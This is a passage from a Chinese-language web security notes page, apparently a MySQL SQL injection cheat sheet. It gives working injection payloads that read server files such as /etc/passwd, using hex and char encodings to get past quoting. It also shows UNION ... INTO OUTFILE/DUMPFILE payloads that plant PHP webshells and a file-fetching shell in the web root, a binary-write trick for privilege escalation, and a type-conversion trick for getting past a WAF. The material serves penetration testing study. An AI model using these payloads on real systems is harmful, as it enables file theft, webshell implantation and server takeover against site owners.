+<p>For security reasons, when reading text files located on the server, the files must either reside in the database directory or be readable by all. Also, to use LOAD DATA INFILE on server files, you must have the <strong>FILE privilege</strong>.
+- 文件大小必须小于 max_allowed_packet。
+- @@max_allowed_packet的默认大小是1047552 字节.</p>
+</blockquote>
+<p><code>test.php?id=1'/**/union/**/select/**/1,load_file('c:/boot.ini')</code>  //magic_quotes_gpc = off
+<code>test.php?id=1'/**/union/**/select/**/1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code>  //magic_quotes_gpc = on/用ascii 编码下即可
+<code>test.php?id=1'/**/union/**/select/**/1,load_file(0x633A5C626F6F742E696E69),3/*</code>   //magic_quotes_gpc = on/用16进制即可</p>
+<p><code>load_file(0x2f6574632f706173737764)</code> （*nix系统的/etc/passwd）
+id=1 and(select `load_file`(0x2f6574632f706173737764)&gt;0x726f66) # 由于mysql 语法特性`函数名`()等价于函数名()</p>
+<h3 id="mysql-3-x">mysql 3.x</h3>
+<pre><code>mysql&gt;create table a (cmd text);
+mysql&gt;load data infile 'c:\\boot.ini' into table a;
+mysql&gt;select * from a;
+
+mysql&gt;create table potatoes(line blob);
+mysql&gt;union select 1,1, hex(load_file('/etc/passwd')), 1,1 into dumpfile '/tmp/potatoes';
+mysql&gt;load data infile '/tmp/potatoes' into table potatoes;
+</code></pre>
+<h3 id="mysql-4-x">mysql 4.x</h3>
+<p>同上</p>
+<h3 id="mysql-5-x">mysql 5.x</h3>
+<p><code>mysql&gt;system cat /etc/passwd</code></p>
+<h2 id="三-写文件">三、写文件</h2>
+<p>需要连接数据库的用户有file_priv 权限，且启动mysqld 的用户对目录需要有写权限，需要物理路径（爆路径漏洞或phpinfo），不存在重名文件，不过滤<code>'"</code>(因为没有办法编码路径名)，如果secure_file_priv非空，则写入文件的目录只能为对应目录下。注意：普通用户创建的文件默认权限是 644，但如php/jsp/asp 这些脚本是不需要可执行权限就能访问而被执行的，如 perl/python/bash/c++ 等写成的cgi 是需要可执行权限才能执行的。
+<code>test.php?id=1 union select 1,2,3,4,"&lt;?php @eval($_POST[cmd])?&gt;",6 into outfile "/var/www/shell.php"</code>
+<code>test.php?id=1 union select 1,2,3,4,"&lt;?php @eval($_POST[cmd])?&gt;",6 into dumpfile "/var/www/shell.php"</code>
+<code>SELECT '&lt;? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?&gt;' INTO OUTFILE '/var/www/get.php'</code>
+FIELDS TERMINATED BY 原理为在输出数据的每个字段之间插入webshell内容，所以如果select返回的只有一个字段，则写入的文件不包含webshell内容，例如下面语句：
+<code>SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e</code>
+写入的文件中只包含username的值而没有webshell内容;</p>
+<p>LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容，更为通用。此外，该类方式可以用于limit等不能union的语句之后进行写文件操作。</p>
+<p>dumpfile与outfile函数区别</p>
+<p>SELECT into outfile :可以导出每行</p>
+<p>SELECT into dumpfile :只能导出一行（将目标文件写入同一行内）</p>
+<p>into outfile不可导出二进制文件，文件会被破坏，转义等</p>
+<p>into dumpfile可导出完整可执行二进制文件</p>
+<p>into outfile:导出内容</p>
+<p>into dumpfile:导出二进制文件</p>
+<h2 id="四-直接写exe-dll文件提权">四、直接写exe,dll文件提权</h2>
+<p>MYSQL只要数据能在对应数据类型的列中完整存储，就可以导出任意文件名的完整文件。也就是说，我们把二进制文件用HEX()编码后可以存储在TEXT数据类型等非二进制编码的字段上，导出时UNHEX()解码依然能保存为完整的二进制文件。如</p>
+<pre><code>mysql&gt;create table a (id int,cmd TEXT);
+mysql&gt;insert into a (id,cmd) values (1,hex(load_file('c:\\windows\\system32\\regedt32.exe')));
+mysql&gt;select unhex(cmd) FROM a where id =1 INTO DUMPFILE 'd:\\regedt32.exe';
+</code></pre>
+<p>语句中unhex(cmd)已经改变了所选字段的数据类型为二进制，因此可以导出完整的二进制文件，而在注入中我们用UNION连接SELECT语句时，UNION后面查询的字段数量、字段数据类型都得与最前面的SELECT一样，此时</p>
+<p><code>SELECT cmd FROM a where id=1 and 1=2 UNION SELECT unhex(cmd) FROM a INTO DUMPFILE 'd:\\regedt32.exe';</code></p>
+<p>语句中unhex(cmd)字段的数据类型与最前面的cmd字段的数据类型不同，二进制编码的数据无法在TEXT数据类型中完整储存，因此无法导出完整的二进制文件。要导出完整的二进制文件，最前面SELECT所选的字段中必须有以二进制存储数据的数据类型，如BLOB,LONGBLOB等。</p>
+<p>如果使用INTO DUMPFILE导出数据，则MySQL只把一行写入到文件中，不对任何列或行进行终止，也不执行任何转义处理。INTO DUMPFILE 的这个特性说白了就是“无缝连接”，它既可以用于从列中导出数据到文件，也可以用于从表中导出数据到文件。</p>
+<p>UNHEX()函数执行从HEX()的反向操作，0x 作用与UNHEX()意义相同。就是说，它将参数中的每一对十六进制数字理解为一个数字，并将其转化为该数字代表的字符，结果字符以二进制字符串的形式返回。</p>
+<h2 id="五-mysql-的类型隐式转换">五、mysql 的类型隐式转换</h2>
+<pre><code>mysql&gt; SELECT * FROM users WHERE username = 'a'+'b' AND password = 'a'+'b';
++--------+----------+--------------------+
+| userid | username | password           |
++--------+----------+--------------------+
+|      1 | admin    | MySuperS3cretPass! |
++--------+----------+--------------------+
+1 row in set, 7 warnings (0.00 sec)
+mysql&gt; SELECT * FROM users WHERE username = 'a'+'666' AND password = 'a'+'b';
++--------+----------+----------+
+| userid | username | password |
++--------+----------+----------+
+|      2 | 666admin | nataSmaI |
++--------+----------+----------+
+</code></pre>
+<p>加号在这里是算术运算符，故会产生类型转换为double，如下引用所示：</p>
+<blockquote>
+<p>When an operator is used with operands of different types, type conversion occurs to make the operands compatible.
+In all other cases, the arguments are compared as floating-point (real) numbers.</p>
+</blockquote>
+<p>这是一条绕过 WAF 的 vector。</p>
+<h2 id="Reference">Reference</h2>
+<p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" rel="noopener noreferrer">sql-injection-cheat-sheet</a>
+<a href="https://tom.vg/2013/04/mysql-implicit-type-conversion/" rel="noopener noreferrer">Implicit type conversion in MySQL</a>
+<a href="http://websec.ca/kb/sql_injection" rel="noopener noreferrer">sql_injection</a>
+<a href="https://paper.seebug.org/3116/" rel="noopener noreferrer">NoSQL 从 0 到1（MongoDB and InfluxDB）</a></p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#一-查询数据库信息">一、查询数据库信息</a></li><li style="margin-left:0.8rem"><a href="#内置变量列表">内置变量列表</a></li><li style="margin-left:0.8rem"><a href="#可回显注入">可回显注入</a></li><li style="margin-left:0.8rem"><a href="#盲注查询">盲注查询</a></li><li style="margin-left:0.8rem"><a href="#报错注入">报错注入</a></li><li style="margin-left:0.0rem"><a href="#二-读文件">二、读文件</a></li><li style="margin-left:0.8rem"><a href="#判断权限">判断权限</a></li><li style="margin-left:0.8rem"><a href="#mysql-3-x">mysql 3.x</a></li><li style="margin-left:0.8rem"><a href="#mysql-4-x">mysql 4.x</a></li><li style="margin-left:0.8rem"><a href="#mysql-5-x">mysql 5.x</a></li><li style="margin-left:0.0rem"><a href="#三-写文件">三、写文件</a></li><li style="margin-left:0.0rem"><a href="#四-直接写exe-dll文件提权">四、直接写exe,dll文件提权</a></li><li style="margin-left:0.0rem"><a href="#五-mysql-的类型隐式转换">五、mysql 的类型隐式转换</a></li><li style="margin-left:0.0rem"><a href="#Reference">Reference</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Web 安全 / 注入与请求伪造</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">Web 安全</span><span class="tag">注入与请求伪造</span><span class="tag">MySQL</span><span class="tag">PHP</span><span class="tag">SQL注入</span><span class="tag">权限管理</span><span class="tag">日志分析</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：01-Web安全/02-注入与请求伪造/SQL注入/MYSQL注入.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%B3%A8%E5%85%A5%E4%B8%8E%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%2BMySQL%2BPHP-%E4%B8%80%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>一、查询数据库信息。本文属于Web 安全 / 注入与请求伪造，mysql 5 联合查询；mysql 4 不支持联合查询。 我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样）…</p>
+      <p>关键词：Web 安全、注入与请求伪造、MySQL、PHP、SQL注入、权限管理、日志分析、知识笔记、Web 安全 / 注入与请求伪造、一、查询数据库信息</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html"><small>上一篇</small>一、本地文件包含</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-82bdca953573.html"><small>下一篇</small>一、漏洞挖掘心理学</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
